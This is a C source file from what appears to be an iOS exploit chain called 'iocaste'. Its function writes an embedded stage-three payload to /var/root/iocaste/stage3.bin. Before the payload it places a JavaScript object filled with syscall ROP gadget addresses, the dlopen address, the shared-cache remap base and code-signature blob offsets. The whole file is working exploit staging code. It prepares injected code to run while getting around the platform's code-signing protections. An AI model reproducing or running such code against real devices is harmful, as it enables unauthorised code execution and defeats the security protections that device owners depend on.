#include "util.h"
#include "iocaste.h"

int gen_stage3(void) {
    size_t stage3_size = 0;
    void *stage3_data = load_embedded_file("__stage3", &stage3_size);
    if (stage3_data == NULL) {
        fprintf(stderr, "[-] failed to load __stage3 section\n");
        return -1;
    }

    int fd = open("/var/root/iocaste/stage3.bin", O_RDWR|O_CREAT, 0777);
    if (fd < 0) {
        fprintf(stderr, "[-] failed to create /var/root/iocaste/stage3.bin\n");
        return -1;
    }
    
    ftruncate(fd, 0x20000);
    lseek(fd, 0, SEEK_SET);

    char *info_buf = calloc(1, 0x4000);
    snprintf(info_buf, 0x4000-1, 
        "var info = {\n \
            self_port_addr: 0x0,\n \
            self_task_addr: 0x0,\n \
            self_proc_addr: 0x0,\n \
            host_port_addr: 0x0,\n \
            syscall_version: 0x%x,\n \
            syscall_gadget1: 0x%x,\n \
            syscall_gadget2: 0x%x,\n \
            syscall_gadget3: 0x%x,\n \
            syscall_gadget4: 0x%x,\n \
            syscall_gadget5: 0x%x,\n \
            syscall_orig_lr: 0x%x,\n \
            dlopen_addr: 0x%x,\n \
            dsc_slide: 0x0,\n \
            remap_base: 0x%x,\n \
            libdispatch_file_size: 0x%x,\n \
            libdispatch_csblob_size: 0x%x,\n \
            libdispatch_csblob_offset: 0x%x\n \
        }\n\n\n\n",
        iocaste->gadgets.syscall.version,
        DSC_REMAP_ADDR(iocaste->gadgets.syscall.gadget1),
        DSC_REMAP_ADDR(iocaste->gadgets.syscall.gadget2),
        DSC_REMAP_ADDR(iocaste->gadgets.syscall.gadget3),
        DSC_REMAP_ADDR(iocaste->gadgets.syscall.gadget4),
        DSC_REMAP_ADDR(iocaste->gadgets.syscall.gadget5),
        iocaste->gadgets.syscall.orig_lr,
        iocaste->symbols.dlopen,
        iocaste->dsc.remap_base,
        iocaste->offsets.csblob.file_size,
        iocaste->offsets.csblob.signature_size,
        iocaste->offsets.csblob.file_offset
    );

    size_t info_size = strlen(info_buf);
    write(fd, info_buf, info_size);
    free(info_buf);

    write(fd, stage3_data, stage3_size);
    fcntl(fd, F_FULLFSYNC);
    close(fd);
    return 0;
}
